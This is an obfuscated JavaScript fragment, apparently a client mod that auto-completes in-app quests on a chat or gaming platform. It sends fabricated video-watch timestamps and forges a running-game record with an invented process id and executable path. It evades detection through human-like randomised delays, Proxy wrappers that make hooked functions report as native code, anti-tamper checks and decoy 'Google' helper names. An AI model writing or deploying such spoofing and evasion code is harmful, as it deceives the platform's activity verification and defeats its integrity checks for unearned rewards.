      const _0xresting = new Set(); // D-gate: ids that proved quiet (static) — yield queue priority until they show life
      const _0xvrank = (q) => { try { if (q && _0xresting.has(q.id)) return 2; } catch (e) {} return _0xvidRank(q); }; // 2 sorts before video(0)/task(1) = popped last (LIFO)
      const _0xvo = _0xb.filter(q => _0xvidRank(q) !== 0), _0xvv = _0xb.filter(q => _0xvidRank(q) === 0);
      for (let i = _0xvo.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [_0xvo[i], _0xvo[j]] = [_0xvo[j], _0xvo[i]];
      }
      _0xb = _0xvo.concat(_0xvv); // videos last = popped first (LIFO); others stay shuffled
      
      Log.say(_0xlex.C(2), _0xlex.P(21,[`${_0xb.length}${_0xed(3641)}${_0xb.length === 1 ? "" : "s"}${_0xed(3649)}`,`${_0xb.length}${_0xed(3684)}${_0xb.length === 1 ? "" : "s"}${_0xed(3692)}`,`${_0xb.length}${_0xed(3728)}${_0xb.length === 1 ? "" : "s"}${_0xed(3736)}`,`${_0xb.length}${_0xed(3763)}${_0xb.length === 1 ? "" : "s"}${_0xed(3771)}`,`${_0xb.length}${_0xed(3808)}${_0xb.length === 1 ? "" : "s"}${_0xed(3816)}`,`${_0xb.length}${_0xed(3850)}${_0xb.length === 1 ? "" : "s"}${_0xed(3858)}`,`${_0xb.length}${_0xed(3881)}${_0xb.length === 1 ? "" : "s"}${_0xed(3889)}`,`${_0xb.length}${_0xed(3916)}${_0xb.length === 1 ? "" : "s"}${_0xed(3924)}`,`${_0xb.length}${_0xed(3959)}${_0xb.length === 1 ? "" : "s"}${_0xed(3967)}`,`${_0xb.length}${_0xed(3980)}${_0xb.length === 1 ? "" : "s"}${_0xed(3988)}`,`${_0xb.length}${_0xed(4011)}${_0xb.length === 1 ? "" : "s"}${_0xed(4019)}`,`${_0xb.length}${_0xed(4044)}${_0xb.length === 1 ? "" : "s"}${_0xed(4052)}`,`${_0xb.length}${_0xed(4082)}${_0xb.length === 1 ? "" : "s"}${_0xed(4090)}`,`${_0xb.length}${_0xed(4126)}${_0xb.length === 1 ? "" : "s"}${_0xed(4134)}`,`${_0xb.length}${_0xed(4171)}${_0xb.length === 1 ? "" : "s"}${_0xed(4179)}`]));
      const _0xlost = _0xeligible.length - _0xb.length;
      if (_0xlost > 0) Log.say(_0xlex.C(2), _0xlex.P(22,[`${_0xlost}${_0xed(4217)}`,`${_0xlost}${_0xed(4262)}`,`${_0xlost}${_0xed(4310)}`,`${_0xlost}${_0xed(4350)}`,`${_0xlost}${_0xed(4389)}`,`${_0xlost}${_0xed(4427)}`,`${_0xlost}${_0xed(4473)}`,`${_0xlost}${_0xed(4518)}`,`${_0xlost}${_0xed(4565)}`,`${_0xlost}${_0xed(4599)}`,`${_0xlost}${_0xed(4644)}`,`${_0xlost}${_0xed(4685)}`,`${_0xlost}${_0xed(4729)}`,`${_0xlost}${_0xed(4766)}`,`${_0xlost}${_0xed(4806)}`]));
      
      if (!_0xb.length) { 
        Log.say(_0xlex.C(13), _0xlex.P(24,[_0xed(4850),_0xed(4942),_0xed(5029),_0xed(5126),_0xed(5214),_0xed(5270),_0xed(5331),_0xed(5411),_0xed(5495),_0xed(5573),_0xed(5648),_0xed(5740),_0xed(5800),_0xed(5879),_0xed(5950)])); 
        GoogleRelease(); try { _0xmod.host?.shut?.(); } catch (e) {} 
        return; 
      }

      let _0xc = typeof window[_0xq1] !== "undefined";
      let _0xkill = false, _0xpaus = false, _0xheat = 1;
      let _0xroute0 = ((1 / 3) * 3) === 1 ? location.pathname : location.pathname.slice(0);
      const _0xch = "g" + Math.random().toString(36).slice(2) + Date.now().toString(36);
      let _0xlastHidden = null;

      const _0xdae0 = (ms, sig) => _0xr2.scheduler.sleep(ms, sig);

      
      let delayCount = 0;
      const _0x0a94 = ms => {
        delayCount++;
        if (delayCount === 1 || delayCount % 10 === 0) {
          Log.diag("phase-d", { count: delayCount, milliseconds: Math.round(ms), heat: Number(_0xheat.toFixed(2)) });
        }
      };

      
      const _0xln = (ms) => {
        const _0u1 = Math.random() || 1e-9, _0u2 = Math.random() || 1e-9;
        const _0z = Math.sqrt(-2.0 * Math.log(_0u1)) * Math.cos(2.0 * Math.PI * _0u2);
        return Math.min(Math.max(Math.exp(Math.log(ms) + _0z * 0.35), ms * 0.3), ms * 4.0);
      };
      let GoogleDelay = async (d = 1) => {
        if (document.hidden !== _0xlastHidden) {
          _0xlastHidden = document.hidden;
          Log.say(_0xlex.C(18), document.hidden ? _0xlex.P(50,[_0xed(6018),_0xed(6056),_0xed(6099),_0xed(6135),_0xed(6173),_0xed(6214),_0xed(6250),_0xed(6291),_0xed(6332),_0xed(6373),_0xed(6412),_0xed(6450),_0xed(6491),_0xed(6532),_0xed(6576)]) : _0xlex.P(51,[_0xed(6614),_0xed(6645),_0xed(6678),_0xed(6709),_0xed(6742),_0xed(6773),_0xed(6811),_0xed(6845),_0xed(6872),_0xed(6908),_0xed(6946),_0xed(6975),_0xed(7012),_0xed(7045),_0xed(7080)]));
        }
        let base = _0xln(d * 1000);
        if (document.hidden) base += Math.random() * 4000 + 2000;
        if (Math.random() < 0.12) base += 1800 + Math.random() * 2200;
        base *= _0xheat;
        
        _0x0a94(base);
        try { _0xr2.telemetry.mark('delay'); } catch (e) {}

        let remaining = base;
        while (remaining > 0 && !signal.aborted) {
          if (_0xpaus) { await _0xdae0(900, signal); continue; }
          const chunk = Math.min(remaining, 5000);
          const start = Date.now();
          try { await _0xdae0(chunk, signal); } catch(e) { if(e.name === 'AbortError') return; throw e; }
          remaining -= (Date.now() - start);
        }
      };

      
      const GoogleDelayRaw = async (ms) => {
        let remaining = Math.max(0, ms);
        while (remaining > 0 && !signal.aborted) {
          const chunk = Math.min(remaining, 5000);
          const start = Date.now();
          try { await _0xdae0(chunk, signal); } catch(e) { if(e.name === 'AbortError') return; throw e; }
          remaining -= (Date.now() - start);
        }
      };

      _0xchord = (e) => {
        if (!(e.altKey && e.shiftKey)) return;
        const key = String(e?.key ?? '').toLowerCase();
        if (key === 'x' && !_0xkill) { _0xkill = true; controller.abort(); Log.say(_0xlex.C(6), _0xlex.P(25,[_0xed(7115),_0xed(7175),_0xed(7246),_0xed(7312),_0xed(7375),_0xed(7436),_0xed(7500),_0xed(7565),_0xed(7631),_0xed(7690),_0xed(7750),_0xed(7814),_0xed(7875),_0xed(7935),_0xed(7994)])); }
      };
      document.addEventListener("keydown", _0xchord, true);


      const GooglePost = _0x9.post.bind(_0x9);
      const GoogleGet = _0x9.get.bind(_0x9);
      const _0xsend = _0xr2.host.dispatcher(_0x8);
      const _0xon = _0x8.subscribe.bind(_0x8);
      const _0xoff = _0x8.unsubscribe.bind(_0x8);
      const _0xprimaryActivity = (() => {
        let active = null;
        const begin = async (record) => {
          let spins = 0;
          while (active !== null && !signal.aborted && !_0xkill && spins++ < 5000) await GoogleDelay(1);
          if (active !== null || signal.aborted || _0xkill) return false;
          active = record;
          try {
            _0xsend({ type: _0xe0, removed: [], added: [record], games: [record] });
            return true;
          } catch (e) {
            active = null;
            throw e;
          }
        };
        const end = (record) => {
          if (active !== record) return;
          try { _0xsend({ type: _0xe0, removed: [record], added: [], games: [] }); }
          finally { active = null; }
        };
        return { begin, end, active: () => active !== null };
      })();

      const GoogleCall = (fn, critical = false) => async (opts) => {
        let tries = 0;
        while (tries < 3 && !signal.aborted) {
          try {
            const finalOpts = (opts && typeof opts.url === "string") ? opts : null;
            if (!finalOpts || finalOpts.url === "" || !finalOpts.url.startsWith("/")) {
              
              return { body: {}, skipped: true };
            }
            const res = await _0xr2.transport.call(fn, finalOpts);
            if (_0xheat > 1) _0xheat = Math.max(1, _0xheat - 0.1);
            return res;
          } catch (e) {
            const st = e?.status ?? e?.body?.status ?? 0;
            if (st === 401) { if (critical) { _0xkill = true; controller.abort(); Log.say(_0xlex.C(0), _0xlex.P(3,[_0xed(8767),_0xed(8803),_0xed(8838),_0xed(8885),_0xed(8923),_0xed(8968),_0xed(9008),_0xed(9051),_0xed(9091),_0xed(9136),_0xed(9178),_0xed(9218),_0xed(9267),_0xed(9308),_0xed(9353)])); } throw e; }
            if (st === 429) {
              _0xheat = Math.min(4, _0xheat * 1.5);
              const retryAfter = Number(e?.body?.retry_after ?? e?.retry_after ?? 4);
              const s = Number.isFinite(retryAfter) && retryAfter >= 0 ? Math.min(300, Math.ceil(retryAfter) + 1 + Math.random()) : 5 + Math.random() * 2;
              Log.say(_0xlex.C(7), _0xlex.P(30,[`${_0xed(9401)}${Math.ceil(s)}${_0xed(9441)}`,`${_0xed(9466)}${Math.ceil(s)}${_0xed(9507)}`,`${_0xed(9511)}${Math.ceil(s)}${_0xed(9556)}`,`${_0xed(9560)}${Math.ceil(s)}${_0xed(9604)}`,`${_0xed(9608)}${Math.ceil(s)}${_0xed(9655)}`,`${_0xed(9659)}${Math.ceil(s)}${_0xed(9704)}`,`${_0xed(9729)}${Math.ceil(s)}${_0xed(9769)}`,`${_0xed(9773)}${Math.ceil(s)}${_0xed(9814)}`,`${_0xed(9839)}${Math.ceil(s)}${_0xed(9888)}`,`${_0xed(9892)}${Math.ceil(s)}${_0xed(9935)}`,`${_0xed(9939)}${Math.ceil(s)}${_0xed(9990)}`,`${_0xed(9994)}${Math.ceil(s)}${_0xed(10040)}`,`${_0xed(10044)}${Math.ceil(s)}${_0xed(10091)}`,`${_0xed(10095)}${Math.ceil(s)}${_0xed(10140)}`,`${_0xed(10144)}${Math.ceil(s)}${_0xed(10187)}`]));
              await GoogleDelayRaw(s * 1000); tries++; continue;
            }
            if (st >= 500 && st < 600) { 
              const backoff = Math.pow(2, tries) * 2 + (Math.random() * 2); 
              Log.say(_0xlex.C(7), _0xlex.P(31,[`${_0xed(10212)}${st}${_0xed(10227)}${backoff.toFixed(1)}${_0xed(10254)}`,`${_0xed(10258)}${st}${_0xed(10273)}${backoff.toFixed(1)}${_0xed(10300)}`,`${_0xed(10317)}${st}${_0xed(10332)}${backoff.toFixed(1)}${_0xed(10363)}`,`${_0xed(10367)}${st}${_0xed(10382)}${backoff.toFixed(1)}${_0xed(10417)}`,`${_0xed(10421)}${st}${_0xed(10436)}${backoff.toFixed(1)}${_0xed(10463)}`,`${_0xed(10467)}${st}${_0xed(10482)}${backoff.toFixed(1)}${_0xed(10495)}`,`${_0xed(10512)}${st}${_0xed(10527)}${backoff.toFixed(1)}${_0xed(10558)}`,`${_0xed(10562)}${st}${_0xed(10577)}${backoff.toFixed(1)}${_0xed(10600)}`,`${_0xed(10604)}${st}${_0xed(10619)}${backoff.toFixed(1)}${_0xed(10650)}`,`${_0xed(10654)}${st}${_0xed(10669)}${backoff.toFixed(1)}${_0xed(10690)}`,`${_0xed(10694)}${st}${_0xed(10709)}${backoff.toFixed(1)}${_0xed(10726)}`,`${_0xed(10730)}${st}${_0xed(10745)}${backoff.toFixed(1)}${_0xed(10764)}`,`${_0xed(10781)}${st}${_0xed(10796)}${backoff.toFixed(1)}${_0xed(10831)}`,`${_0xed(10835)}${st}${_0xed(10850)}${backoff.toFixed(1)}${_0xed(10877)}`,`${_0xed(10881)}${st}${_0xed(10896)}${backoff.toFixed(1)}${_0xed(10931)}`])); 
              await GoogleDelayRaw(backoff * 1000); tries++; continue; 
            }
            throw e;
          }
        }
        throw new Error("Max retries exceeded");
      };
      const GooglePostSafe = GoogleCall(GooglePost, true);
      const GoogleGetSafe = GoogleCall(GoogleGet, false);

      const GoogleHook = (obj, key, fn) => {
        // Blueprint 5: Runtime Integrity & Anti-Tamper Verification
        try {
          const _0xts = Function.prototype.toString;
          if (typeof _0xts !== "function" || !/native code/.test(Function.prototype.toString.call(_0xts))) {
            Log.say(_0xlex.C(0), "Host runtime environment altered; terminating hook.");
            return null;
          }
        } catch (e) { return null; }
        if (!obj || Object.isFrozen(obj) || Object.isSealed(obj)) { Log.say(_0xlex.C(0), _0xlex.P(4,[`${_0xed(10935)}${key}${_0xed(10944)}`,`${_0xed(10984)}${key}${_0xed(10993)}`,`${_0xed(11029)}${key}${_0xed(11038)}`,`${_0xed(11075)}${key}${_0xed(11084)}`,`${_0xed(11120)}${key}${_0xed(11129)}`,`${_0xed(11168)}${key}${_0xed(11177)}`,`${_0xed(11207)}${key}${_0xed(11216)}`,`${_0xed(11251)}${key}${_0xed(11260)}`,`${_0xed(11293)}${key}${_0xed(11302)}`,`${_0xed(11334)}${key}${_0xed(11343)}`,`${_0xed(11370)}${key}${_0xed(11379)}`,`${_0xed(11415)}${key}${_0xed(11424)}`,`${_0xed(11455)}${key}${_0xed(11464)}`,`${_0xed(11496)}${key}${_0xed(11505)}`,`${_0xed(11535)}${key}${_0xed(11544)}`])); return null; }
        try {
          const own = Object.getOwnPropertyDescriptor(obj, key);
          let cur = Object.getPrototypeOf(obj), d = null;
          while (cur && !d) { d = Object.getOwnPropertyDescriptor(cur, key); cur = d ? cur : Object.getPrototypeOf(cur); }
          const flags = d && !d.get ? { writable: !!d.writable, configurable: !!d.configurable, enumerable: !!d.enumerable } : { writable: false, configurable: true, enumerable: false };
          Object.defineProperty(obj, key, { value: fn, ...flags });
          return () => { try { if (own) Object.defineProperty(obj, key, own); else delete obj[key]; } catch (e) {} };
        } catch (e) { Log.say(_0xlex.C(0), _0xlex.P(5,[`${_0xed(11579)}${key}${_0xed(11599)}${e.message}`,`${_0xed(11610)}${key}${_0xed(11627)}${e.message}`,`${_0xed(11637)}${key}${_0xed(11662)}${e.message}`,`${_0xed(11671)}${key}${_0xed(11701)}${e.message}`,`${_0xed(11704)}${key}${_0xed(11735)}${e.message}`,`${_0xed(11738)}${key}${_0xed(11759)}${e.message}`,`${_0xed(11769)}${key}${_0xed(11790)}${e.message}`,`${_0xed(11800)}${key}${_0xed(11806)}${e.message}`,`${_0xed(11833)}${key}${_0xed(11856)}${e.message}`,`${_0xed(11859)}${key}${_0xed(11876)}${e.message}`,`${_0xed(11879)}${key}${_0xed(11890)}${e.message}`,`${_0xed(11900)}${key}${_0xed(11925)}${e.message}`,`${_0xed(11936)}${key}${_0xed(11954)}${e.message}`,`${_0xed(11964)}${key}${_0xed(11989)}${e.message}`,`${_0xed(11992)}${key}${_0xed(12028)}${e.message}`])); return null; }
      };

      const GoogleNative = (fn, nativeStr, nameStr, lenNum) => new Proxy(fn, {
        get(target, prop, receiver) { if (prop === 'toString') return () => nativeStr; if (prop === 'name' && nameStr != null) return nameStr; if (prop === 'length' && lenNum != null) return lenNum; return Reflect.get(target, prop, receiver); },
        getOwnPropertyDescriptor(target, prop) { if (prop === 'toString') return Object.getOwnPropertyDescriptor(Function.prototype, 'toString'); return Reflect.getOwnPropertyDescriptor(target, prop); },
        apply(target, thisArg, args) { return Reflect.apply(target, thisArg, args); },
        has(target, prop) { return prop === 'toString' || Reflect.has(target, prop); },
        deleteProperty() { return false; }, defineProperty() { return false; }
      });

      const GoogleProgress = (data, task, cfgv) => {
        try {
          const candidates = cfgv === 1 ? [data?.[_0xqa]?.[_0xqd], data?.[_0xqa]?.progress?.[task]?.value] : [data?.[_0xqa]?.progress?.[task]?.value, data?.[_0xqa]?.[_0xqd], data?.progress?.[task]?.value];
          const valid = candidates.find(n => { if (n === null || n === undefined || n === "" || typeof n === "boolean") return false; const value = Number(n); return Number.isFinite(value) && value >= 0; });
          return valid === undefined ? null : Number(valid);
        } catch (e) { return null; }
      };

      const _0xbb86 = (body, taskName) => {
        if (!body || typeof body !== 'object') return null;
        if (typeof body.progress === 'number' && Number.isFinite(body.progress) && body.progress >= 0) return body.progress;
        const prog = body.progress?.[taskName] ?? body[taskName];
        if (prog === null || prog === undefined) return null;
        const val = typeof prog === 'object' ? prog.value : prog;
        const num = Number(val);
        return Number.isFinite(num) && num >= 0 ? num : null;
      };

      // D-gate (red-forge item 4): static-store abort. Pass the chore handle v;
      // svalOverride set only by tick-loop handlers (video/activity) that poll
      // a POST endpoint instead of the store. Counts consecutive identical
      // observations; on the 6th identical (5 repeats) flags v._0xda and asks
      // the caller to abort the chore early. Blind (null/unreadable) fails open.
      const _0xDMAX = 5;
      const _0xdg8n = (v, svalOverride) => {
        try {
          if (v.cur >= v.goal) return false; // at goal: let completion/verify settle it, never abort
          let sval = (svalOverride === undefined) ? null : svalOverride;
          if (svalOverride === undefined) {
            try {
              const _0dvl = _0xr2.store.values(_0x5[_0xq7]);
              if (typeof _0dvl !== 'function') return false;
              const _0dq = Array.from(_0dvl.call(_0x5[_0xq7])).find(x => x && x.id === v.q.id);
              sval = _0dq?.[_0xqa]?.progress?.[v.taskType]?.value ?? null;
            } catch (e) { return false; }
          }
          if (sval === null || sval === undefined) return false;
          if (v._0xds === undefined) { v._0xds = sval; v._0xdn = 0; return false; }
          if (sval === v._0xds) { v._0xdn++; } else { v._0xds = sval; v._0xdn = 0; return false; }
          if (v._0xdn >= _0xDMAX) {
            v._0xda = true;
            try { Log.say(_0xlex.C(0), 'Shelf quiet on this chore \u2014 setting it aside for now.'); } catch (e) {}
            return true;
          }
          return false;
        } catch (e) { return false; }
      };

      const _0x8d20 = (str) => String(str || "").replace(/[\/\\:*?"<>|]/g, "");

      const _0xvideo = async (v) => {
        Log.say(_0xlex.C(12), _0xlex.P(32,[`${_0xed(12031)}${v.name}${_0xed(12053)}`,`${_0xed(12056)}${v.name}${_0xed(12071)}`,`${_0xed(12089)}${v.name}${_0xed(12103)}`,`${_0xed(12106)}${v.name}${_0xed(12116)}`,`${_0xed(12133)}${v.name}${_0xed(12143)}`,`${_0xed(12156)}${v.name}${_0xed(12167)}`,`${_0xed(12185)}${v.name}${_0xed(12197)}`,`${_0xed(12215)}${v.name}${_0xed(12228)}`,`${_0xed(12243)}${v.name}${_0xed(12268)}`,`${_0xed(12271)}${v.name}${_0xed(12281)}`,`${_0xed(12290)}${v.name}${_0xed(12304)}`,`${_0xed(12322)}${v.name}${_0xed(12336)}`,`${_0xed(12339)}${v.name}${_0xed(12349)}`,`${_0xed(12366)}${v.name}${_0xed(12385)}`,`${_0xed(12388)}${v.name}${_0xed(12419)}`]));
        let tick = 0, lastTs = 0;
        while (v.cur < v.goal && !_0xkill && !signal.aborted) {
          let _0x1c = Math.min(v.goal - v.cur, 4 + Math.random() * 8);
          await GoogleDelay(_0x1c); if (_0xkill || signal.aborted) break; await new Promise(r => queueMicrotask(r));
          if (Math.random() < 0.06) { Log.say(_0xlex.C(15), _0xlex.P(33,[_0xed(12422),_0xed(12456),_0xed(12484),_0xed(12518),_0xed(12546),_0xed(12576),_0xed(12605),_0xed(12648),_0xed(12684),_0xed(12715),_0xed(12740),_0xed(12773),_0xed(12805),_0xed(12839),_0xed(12867)])); await GoogleDelay(18 + Math.random() * 24); if (_0xkill || signal.aborted) break; }
          const _0xdiff = (v.goal - (v.cur + _0x1c));
          const _0xmask = (_0xdiff <= 0 ? 1 : 0);
          const _0xstepDelta = ((1 - _0xmask) * _0x1c) + (_0xmask * (v.goal - v.cur));
          const lastBeat = (_0xmask === 1);
          let rawTs = lastBeat ? (v.goal + Math.random() * 1.4) : Math.min(v.goal, v.cur + _0x1c + Math.random());
          let ts = Math.round(Math.max(lastTs + 0.01, rawTs) * 100000) / 100000;
          const _0xmono = ts > lastTs;
          lastTs = ts;
          
          
          Log.diag("phase-t", { tick, monotonic: _0xmono, decimals: String(ts).split(".")[1]?.length ?? 0 });
          
          if (tick === 0) Log.say(_0xlex.C(16), _0xlex.P(34,[`${_0xed(12895)}${Number.isInteger(ts)}${_0xed(12917)}${ts}`,`${_0xed(12929)}${Number.isInteger(ts)}${_0xed(12952)}${ts}`,`${_0xed(12963)}${Number.isInteger(ts)}${_0xed(12986)}${ts}`,`${_0xed(12997)}${Number.isInteger(ts)}${_0xed(13019)}${ts}`,`${_0xed(13030)}${Number.isInteger(ts)}${_0xed(13052)}${ts}`,`${_0xed(13063)}${Number.isInteger(ts)}${_0xed(13086)}${ts}`,`${_0xed(13098)}${Number.isInteger(ts)}${_0xed(13122)}${ts}`,`${_0xed(13133)}${Number.isInteger(ts)}${_0xed(13156)}${ts}`,`${_0xed(13169)}${Number.isInteger(ts)}${_0xed(13194)}${ts}`,`${_0xed(13205)}${Number.isInteger(ts)}${_0xed(13230)}${ts}`,`${_0xed(13241)}${Number.isInteger(ts)}${_0xed(13263)}${ts}`,`${_0xed(13276)}${Number.isInteger(ts)}${_0xed(13301)}${ts}`,`${_0xed(13312)}${Number.isInteger(ts)}${_0xed(13336)}${ts}`,`${_0xed(13347)}${Number.isInteger(ts)}${_0xed(13371)}${ts}`,`${_0xed(13383)}${Number.isInteger(ts)}${_0xed(13408)}${ts}`]));
          let _0x1d = await GooglePostSafe({ url: GoogleRoutes.videoProgress(v.q.id), body: { timestamp: ts } });
          const reported = _0xbb86(_0x1d?.body, v.taskType);
          if (reported !== null) v.cur = reported; else v.cur = Math.min(v.goal, v.cur + _0x1c); if (_0xdg8n(v, reported)) break;
          if (++tick % 3 === 1 || v.cur >= v.goal) Log.say(_0xlex.C(4), _0xlex.P(35,[`${_0xed(13419)}${v.cur.toFixed(2)}${_0xed(13436)}${v.goal}${_0xed(13439)}`,`${_0xed(13442)}${v.cur.toFixed(2)}${_0xed(13461)}${v.goal}${_0xed(13464)}`,`${_0xed(13467)}${v.cur.toFixed(2)}${_0xed(13484)}${v.goal}${_0xed(13487)}`,`${_0xed(13497)}${v.cur.toFixed(2)}${_0xed(13514)}${v.goal}${_0xed(13517)}`,`${_0xed(13528)}${v.cur.toFixed(2)}${_0xed(13547)}${v.goal}${_0xed(13550)}`,`${_0xed(13566)}${v.cur.toFixed(2)}${_0xed(13585)}${v.goal}`,`${_0xed(13588)}${v.cur.toFixed(2)}${_0xed(13605)}${v.goal}${_0xed(13608)}`,`${_0xed(13624)}${v.cur.toFixed(2)}${_0xed(13640)}${v.goal}${_0xed(13643)}`,`${_0xed(13646)}${v.cur.toFixed(2)}${_0xed(13662)}${v.goal}`,`${_0xed(13665)}${v.cur.toFixed(2)}${_0xed(13680)}${v.goal}${_0xed(13683)}`,`${_0xed(13693)}${v.cur.toFixed(2)}${_0xed(13712)}${v.goal}${_0xed(13715)}`,`${_0xed(13725)}${v.cur.toFixed(2)}${_0xed(13742)}${v.goal}${_0xed(13745)}`,`${_0xed(13755)}${v.cur.toFixed(2)}${_0xed(13772)}${v.goal}${_0xed(13775)}`,`${_0xed(13778)}${v.cur.toFixed(2)}${_0xed(13794)}${v.goal}${_0xed(13797)}`,`${_0xed(13807)}${v.cur.toFixed(2)}${_0xed(13823)}${v.goal}${_0xed(13826)}`]));
          if (_0x1d?.body?.completed_at) break;
        }
        if (v.cur >= v.goal) Log.say(_0xlex.C(3), _0xlex.P(39,[`${_0xed(13837)}${v.name}${_0xed(13852)}`,`${_0xed(13855)}${v.name}${_0xed(13869)}`,`${_0xed(13872)}${v.name}${_0xed(13884)}`,`${_0xed(13887)}${v.name}${_0xed(13902)}`,`${_0xed(13905)}${v.name}${_0xed(13919)}`,`${_0xed(13922)}${v.name}${_0xed(13935)}`,`${_0xed(13938)}${v.name}${_0xed(13952)}`,`${_0xed(13955)}${v.name}${_0xed(13966)}`,`${_0xed(13969)}${v.name}${_0xed(13984)}`,`${_0xed(13987)}${v.name}${_0xed(14000)}`,`${_0xed(14003)}${v.name}${_0xed(14017)}`,`${_0xed(14020)}${v.name}${_0xed(14034)}`,`${_0xed(14037)}${v.name}${_0xed(14048)}`,`${_0xed(14051)}${v.name}${_0xed(14064)}`,`${_0xed(14067)}${v.name}${_0xed(14077)}`]));
      };

      const _0xverifyDone = (v, cleanup) => { // silence backstop: play/stream are event-only; verify completion via store
        try {
          const _0v = _0xr2.store.values(_0x5[_0xq7]);
          if (typeof _0v !== "function") return; // handle not ready: retry next cycle, never settle blind
          const _0list = Array.from(_0v.call(_0x5[_0xq7]));
          const q = _0list.find(x => x && x.id === v.q.id);
          let _0vdone = false, _0vline = false, _0vvia = '';
          if (!q || !q[_0xqa]?.[_0xqb]) {
            v._0xvmiss = (v._0xvmiss || 0) + 1;
            if (v._0xvmiss >= 2) { _0vdone = true; _0vline = true; _0vvia = 'gone'; }
          } else {
            v._0xvmiss = 0;
            const pv = q[_0xqa]?.progress?.[v.taskType]?.value;
            if (q[_0xqa]?.[_0xqc]) { _0vdone = true; _0vline = true; _0vvia = 'flag'; }
            else if (Number.isFinite(pv) && pv >= v.goal) { _0vdone = true; _0vline = true; _0vvia = 'value'; }
            else {
              const _0e = new Date(q.config?.expiresAt).getTime();
              if (Number.isFinite(_0e) && _0e <= Date.now() - 5 * 60 * 1000) { _0vdone = true; _0vline = false; _0vvia = 'expired'; }
            }
          }
          if (_0vline) { try { Log.say(_0xlex.C(3), _0xlex.P(39,[`${_0xed(18954)}${v.name}${_0xed(18969)}`,`${_0xed(18972)}${v.name}${_0xed(18986)}`,`${_0xed(18989)}${v.name}${_0xed(19001)}`,`${_0xed(19004)}${v.name}${_0xed(19019)}`,`${_0xed(19022)}${v.name}${_0xed(19036)}`,`${_0xed(19039)}${v.name}${_0xed(19052)}`,`${_0xed(19055)}${v.name}${_0xed(19069)}`,`${_0xed(19072)}${v.name}${_0xed(19083)}`,`${_0xed(19086)}${v.name}${_0xed(19101)}`,`${_0xed(19104)}${v.name}${_0xed(19117)}`,`${_0xed(19120)}${v.name}${_0xed(19134)}`,`${_0xed(19137)}${v.name}${_0xed(19151)}`,`${_0xed(19154)}${v.name}${_0xed(19165)}`,`${_0xed(19168)}${v.name}${_0xed(19181)}`,`${_0xed(19184)}${v.name}${_0xed(19194)}`])); } catch (e) {} }
          if (_0vdone) { try { Log.diag('phase-z', { chore: v.name, via: _0vvia }); } catch (e) {} cleanup(); }
        } catch (e) {}
      };
      const _0xplay = async (v) => {
        const taskId = Symbol(); _0x8844.add(taskId);
        let taskFinished = false; 
        const finishTask = () => { if (!taskFinished) { taskFinished = true; _0x8844.delete(taskId); } };
        
        return new Promise((resolve, reject) => {
          (async () => {
            let handedOff = false;
            try {
              if (!_0xc) { Log.say(_0xlex.C(0), _0xlex.P(6,[`${_0xed(14080)}${v.name}${_0xed(14094)}`,`${_0xed(14140)}${v.name}${_0xed(14154)}`,`${_0xed(14199)}${v.name}${_0xed(14213)}`,`${_0xed(14271)}${v.name}${_0xed(14279)}`,`${_0xed(14326)}${v.name}${_0xed(14340)}`,`${_0xed(14381)}${v.name}${_0xed(14389)}`,`${_0xed(14441)}${v.name}${_0xed(14454)}`,`${_0xed(14499)}${v.name}${_0xed(14513)}`,`${_0xed(14553)}${v.name}${_0xed(14567)}`,`${_0xed(14605)}${v.name}${_0xed(14618)}`,`${_0xed(14657)}${v.name}${_0xed(14671)}`,`${_0xed(14721)}${v.name}${_0xed(14734)}`,`${_0xed(14784)}${v.name}${_0xed(14792)}`,`${_0xed(14851)}${v.name}${_0xed(14865)}`,`${_0xed(14916)}${v.name}${_0xed(14924)}`])); resolve(); return; }
              let _0x1e = await GoogleGetSafe({ url: GoogleRoutes.applicationsUrl(v.app) });
              if (signal.aborted || _0x5c1f.released) { resolve(); return; }
              let _0x1f = _0x1e?.body?.[0]; if (!_0x1f) { Log.say(_0xlex.C(0), _0xlex.P(7,[_0xed(14966),_0xed(15018),_0xed(15059),_0xed(15111),_0xed(15161),_0xed(15206),_0xed(15265),_0xed(15303),_0xed(15352),_0xed(15398),_0xed(15447),_0xed(15490),_0xed(15533),_0xed(15590),_0xed(15637)])); resolve(); return; }
              let _0x20 = _0x1f.executables?.find(x => x && GoogleOS.includes(x.os))?.name?.replace(">", "") ?? _0x1f.name;
              let running = []; try { const currentGames = _0x4?.[_0xm1]?.(); running = Array.isArray(currentGames) ? currentGames : []; } catch (e) { running = []; }
              let _0x1bReal = (running.length > 0 && Number.isFinite(running[0]?.pid)) ? running[0].pid : Math.floor(Math.random() * 60000) + 4096;
              Log.say(_0xlex.C(5), _0xlex.P(41,[`${_0xed(15682)}${_0x1bReal % 4 === 0}${_0xed(15717)}${_0x1bReal}`,`${_0xed(15728)}${_0x1bReal % 4 === 0}${_0xed(15760)}${_0x1bReal}`,`${_0xed(15773)}${_0x1bReal % 4 === 0}${_0xed(15810)}${_0x1bReal}`,`${_0xed(15822)}${_0x1bReal % 4 === 0}${_0xed(15857)}${_0x1bReal}`,`${_0xed(15869)}${_0x1bReal % 4 === 0}${_0xed(15906)}${_0x1bReal}`,`${_0xed(15917)}${_0x1bReal % 4 === 0}${_0xed(15949)}${_0x1bReal}`,`${_0xed(15961)}${_0x1bReal % 4 === 0}${_0xed(15993)}${_0x1bReal}`,`${_0xed(16004)}${_0x1bReal % 4 === 0}${_0xed(16041)}${_0x1bReal}`,`${_0xed(16054)}${_0x1bReal % 4 === 0}${_0xed(16090)}${_0x1bReal}`,`${_0xed(16102)}${_0x1bReal % 4 === 0}${_0xed(16135)}${_0x1bReal}`,`${_0xed(16147)}${_0x1bReal % 4 === 0}${_0xed(16180)}${_0x1bReal}`,`${_0xed(16191)}${_0x1bReal % 4 === 0}${_0xed(16226)}${_0x1bReal}`,`${_0xed(16237)}${_0x1bReal % 4 === 0}${_0xed(16269)}${_0x1bReal}`,`${_0xed(16280)}${_0x1bReal % 4 === 0}${_0xed(16316)}${_0x1bReal}`,`${_0xed(16327)}${_0x1bReal % 4 === 0}${_0xed(16359)}${_0x1bReal}`]));
              const safeName = _0x8d20(_0x1f.name); const safeExe = _0x8d20(_0x20);
              let cmdLine, exePath;
              if (_0xisMac) { cmdLine = `/Applications/${safeName}.app/Contents/MacOS/${safeExe}`; exePath = cmdLine; } 
              else if (_0xisLinux) { cmdLine = `/usr/games/${safeExe}`; exePath = cmdLine; } 
              else { cmdLine = `C:\\Program Files\\${safeName}\\${safeExe}`; exePath = `c:/program files/${safeName.toLowerCase()}/${safeExe.toLowerCase()}`; }
